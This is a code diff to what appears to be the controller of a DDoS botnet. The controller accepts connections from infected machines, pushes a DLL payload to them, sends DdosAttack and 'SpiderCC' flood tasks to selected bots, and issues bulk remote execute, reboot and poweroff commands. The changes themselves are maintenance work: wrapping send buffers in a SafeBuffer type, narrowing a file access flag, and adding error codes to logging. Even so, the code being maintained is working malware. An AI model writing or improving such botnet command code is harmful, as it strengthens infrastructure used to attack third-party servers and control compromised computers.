@@ -438,6 +438,7 @@ void CNetBotDlg::EnableOnlineCtrls(BOOL bEnable)
     GetDlgItem(IDC_EDIT_SELNUM)->ShowWindow(status);
     GetDlgItem(IDC_BTN_MULREBOOT)->ShowWindow(status);
     GetDlgItem(IDC_BTN_MULPOWEROFF)->ShowWindow(status);
+    m_wndStatusBar.ShowWindow(status);
 }
 
 void CNetBotDlg::OnBtnTonline()
@@ -668,7 +669,7 @@ int __stdcall ReadData(TCHAR szFile[], char **data)
     wsprintf(szLogFileName, _T("%s\\%s"), szPath, szFile);
 
     hFile = CreateFile(szLogFileName,
-                       GENERIC_ALL,
+                       GENERIC_READ,
                        FILE_SHARE_READ,
                        (LPSECURITY_ATTRIBUTES)NULL,
                        OPEN_EXISTING,
@@ -687,7 +688,7 @@ int __stdcall ReadData(TCHAR szFile[], char **data)
         return dwSize;
     }
 
-    Mprintf("Read %s Error\n", szLogFileName);
+    Mprintf("Read %s Error: %d\n", szLogFileName, GetLastError());
 
     return -1;
 }
@@ -700,7 +701,7 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 
         //recv socket type
         MsgHead msgHead;
-        char    chBuffer[256];
+        SafeBuffer    chBuffer(256);
 
         //接收上线信息
         if (!RecvMsg(socket, chBuffer, &msgHead)) {
@@ -721,7 +722,7 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
             msgHead.dwCmd = CMD_DLLDATA;
             msgHead.dwSize = SvcFileSize;
 
-            SendMsg(socket, SvcFileBuf, &msgHead);
+            SendMsg(socket, SafeBuffer::From(SvcFileBuf, SvcFileSize), &msgHead);
 
             VirtualFree(SvcFileBuf, SvcFileSize, MEM_RELEASE);
         }
@@ -778,7 +779,7 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
                 msgHeadRep.dwCmd = m_AutoAttack.dwAttackType;
                 msgHeadRep.dwSize = sizeof(DdosAttack);
 
-                SendMsg(socket, (char*)&m_Attack, &msgHeadRep);
+                SendMsg(socket, SafeBuffer::From((char*)&m_Attack, sizeof(DdosAttack)), &msgHeadRep);
                 m_OnLineList.SetItemText(iCount, 6, "任务0");
             }
         }
@@ -1231,7 +1232,7 @@ void CNetBotDlg::OnBtnMulexec()
         if (m_OnLineList.GetCheck(i)) {
             socket = m_OnLineList.GetItemData(i);
 
-            if (SendMsg(socket, chBuffer, &msgHead)) {
+            if (SendMsg(socket, SafeBuffer::From(chBuffer, strlen(chBuffer)), &msgHead)) {
                 iSendNum++;
             } else {
                 shutdown(socket, 0x02);
@@ -1263,7 +1264,7 @@ void CNetBotDlg::OnBtnMulopen()
         if (m_OnLineList.GetCheck(i)) {
             socket = m_OnLineList.GetItemData(i);
 
-            if (SendMsg(socket, chBuffer, &msgHead)) {
+            if (SendMsg(socket, SafeBuffer::From(chBuffer, strlen(chBuffer)), &msgHead)) {
                 iSendNum++;
             } else {
                 shutdown(socket, 0x02);
@@ -1382,7 +1383,7 @@ int CNetBotDlg::AttackTask(int task, CString ip, int port, int type, int thread,
             if (iSendNum < num) {
                 socket = m_OnLineList.GetItemData(i);
 
-                if (SendMsg(socket, (char*)&m_Attack, &msgHead)) {
+                if (SendMsg(socket, SafeBuffer::From((char*)&m_Attack, sizeof(DdosAttack)), &msgHead)) {
                     m_OnLineList.SetItemText(i, 6, strTask);
                     iSendNum++;
                 } else { //发送失败，关闭socket
@@ -1438,7 +1439,7 @@ int CNetBotDlg::AttackSpiderCC(int task, CString ip, int port, int thread, int n
             if (iSendNum < num) {
                 socket = m_OnLineList.GetItemData(i);
 
-                if (SendMsg(socket, (char*)&m_Attack, &msgHead)) {
+                if (SendMsg(socket, SafeBuffer::From((char*)&m_Attack, sizeof(DdosAttack)), &msgHead)) {
                     m_OnLineList.SetItemText(i, 6, strTask);
                     iSendNum++;
                 } else { //发送失败，关闭socket
